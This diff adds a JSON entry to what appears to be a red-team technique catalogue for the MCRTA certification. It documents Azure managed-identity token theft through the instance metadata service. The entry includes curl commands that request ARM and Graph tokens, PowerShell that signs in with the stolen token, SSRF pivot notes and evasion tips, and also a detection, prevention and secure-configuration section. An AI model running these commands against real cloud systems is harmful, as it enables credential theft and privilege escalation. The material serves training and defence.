@@ -1,0 +1,97 @@
+{
+  "id": "azure-managed-identity-token",
+  "name": "Azure Managed Identity Token Theft (VM IMDS)",
+  "command": "curl -H \"Metadata:true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\"",
+  "description": "From code execution on an Azure VM (or App Service/Function) that has a managed identity, request an access token from the Instance Metadata Service (IMDS), then authenticate as that identity. Managed identities frequently hold RBAC roles, so this is a common privilege-escalation / lateral-movement pivot.",
+  "type": "command",
+  "platform": "multi",
+  "requires": [
+    "shell"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "curl",
+    "Az PowerShell"
+  ],
+  "tags": [
+    "azure",
+    "managed-identity",
+    "imds",
+    "token-theft",
+    "privilege-escalation",
+    "metadata",
+    "mcrta"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Cloud - Azure",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "MCRTA (CyberWarFare Labs) - Multi-Cloud Red Team Analyst: Azure",
+  "examples": [
+    {
+      "label": "Request an ARM token for the VM's managed identity",
+      "command": "curl -s -H \"Metadata:true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\""
+    },
+    {
+      "label": "Use the stolen token in Az PowerShell",
+      "command": "$token = \"<access_token>\"\nConnect-AzAccount -AccessToken $token -AccountId <subscription_id>"
+    },
+    {
+      "label": "Enumerate what the managed identity can do",
+      "command": "Get-AzRoleAssignment -ObjectId <managed_identity_principal_id>"
+    },
+    {
+      "label": "Token for Microsoft Graph instead of ARM",
+      "command": "curl -s -H \"Metadata:true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/\""
+    }
+  ],
+  "notes": "IMDS (169.254.169.254) is reachable only from ON the instance and requires the 'Metadata:true' header (blocks naive SSRF that can't set headers - but header-controlling SSRF CAN reach it). Change &resource= to target ARM (management.azure.com) or Graph (graph.microsoft.com) - request a token per resource. System-assigned vs user-assigned identity: for user-assigned add &client_id=<id> or &mi_res_id=<resource_id>. After Connect-AzAccount with the token, you act as the managed identity at its RBAC scope - check Get-AzRoleAssignment for Contributor/Owner to escalate. Classic chain: web SSRF on an Azure VM -> IMDS token -> ARM access.",
+  "references": [
+    {
+      "title": "CyberWarFare Labs - MCRTA",
+      "url": "https://cyberwarfare.live/product/multi-cloud-red-team-analyst-mcrta/"
+    },
+    {
+      "title": "Microsoft Learn - Azure Instance Metadata Service",
+      "url": "https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "azure-arm-enum",
+      "rel": "next",
+      "note": "Enumerate ARM with the stolen identity"
+    },
+    {
+      "id": "ssrf-exploit",
+      "rel": "alternative",
+      "note": "SSRF that can set headers can reach IMDS remotely"
+    }
+  ],
+  "opsec": "moderate",
+  "exam": "exam-ok",
+  "mitre": [
+    "T1552.005",
+    "T1078.004"
+  ],
+  "defense": {
+    "why_it_works": "A VM with an attached managed identity can request OAuth tokens for that identity from the local IMDS endpoint without any secret. Any code (or header-controlling SSRF) running on the instance can obtain a token and then act as the managed identity, inheriting whatever RBAC roles it holds - often far more than the compromised app needs.",
+    "prerequisites": "Code execution on (or header-controlling SSRF against) an Azure VM/App Service/Function that has a system- or user-assigned managed identity with RBAC assignments.",
+    "impact": "T1552.005 Unsecured Credentials: Cloud Instance Metadata API + T1078.004 Valid Accounts: Cloud Accounts. The attacker acts as the managed identity across ARM/Graph - privilege escalation and lateral movement into the subscription.",
+    "detection": "Azure Activity Log: managed-identity principal performing actions from an unexpected context/time; token requests followed by anomalous ARM/Graph calls; Defender for Cloud IMDS/credential-theft alerts. SSRF patterns hitting 169.254.169.254 in web logs.",
+    "artifacts": "Activity Log entries by the managed identity's principalId; token issuance to the MI; web logs with requests to 169.254.169.254.",
+    "prevention": "Least-privilege the managed identity (scope to exactly what the app needs). Use IMDSv-style protections / restrict metadata access (host firewall/eBPF) for workloads that don't need it. Fix SSRF (allowlist egress, block link-local 169.254.0.0/16). Monitor MI usage anomalies.",
+    "evasion": "Use the token quickly and from expected operations; request only the resource you need; blend with the app's normal ARM/Graph calls.",
+    "sources": [
+      "MCRTA Azure",
+      "https://attack.mitre.org/techniques/T1552/005/"
+    ],
+    "misconfiguration": "Over-privileged managed identity (e.g., Contributor at subscription scope) on an internet-facing VM/app; SSRF that can set request headers.",
+    "vulnerable_config": "# MI with Contributor at subscription, app has SSRF -> attacker sets Metadata header via SSRF:\n# GET http://169.254.169.254/metadata/identity/oauth2/token?...&resource=https://management.azure.com/ (Metadata:true)",
+    "secure_config": "# Scope the managed identity to least privilege (specific resource group / resource).\n# Block workload egress to 169.254.169.254 where the app does not need IMDS.\n# Remediate SSRF (egress allowlist, block link-local); alert on MI anomalies in Activity Log."
+  }
+}
